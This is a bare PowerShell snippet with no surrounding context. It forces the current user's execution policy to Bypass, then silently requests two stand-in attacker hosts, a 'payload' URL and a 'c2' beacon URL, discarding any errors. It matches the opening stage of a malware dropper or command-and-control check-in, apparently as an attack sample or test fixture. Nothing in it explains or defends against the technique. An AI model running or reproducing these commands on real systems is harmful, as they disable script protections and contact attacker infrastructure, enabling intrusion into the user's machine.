Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force
$urls = @('http://attacker.example/payload', 'http://c2.example/beacon')
foreach ($url in $urls) { try { Invoke-WebRequest -Uri $url -UseBasicParsing } catch { } }
